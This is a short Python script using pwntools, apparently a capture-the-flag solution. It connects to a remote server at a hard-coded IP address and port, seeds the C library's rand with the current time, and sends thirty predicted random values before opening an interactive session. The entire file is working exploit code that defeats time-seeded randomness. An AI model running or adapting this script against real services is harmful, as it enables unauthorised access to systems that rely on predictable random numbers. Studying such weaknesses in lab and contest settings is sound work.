import math
from ctypes import CDLL
from pwn import *
def get_Random():
	return libc.rand()


libc = CDLL('libc.so.6')

p = remote('167.172.3.35',50010)
now = int(math.floor(time.time()))
libc.srand(now)
for i in range(30):
	
	p.sendline(str(get_Random() & 0xf))

p.interactive()
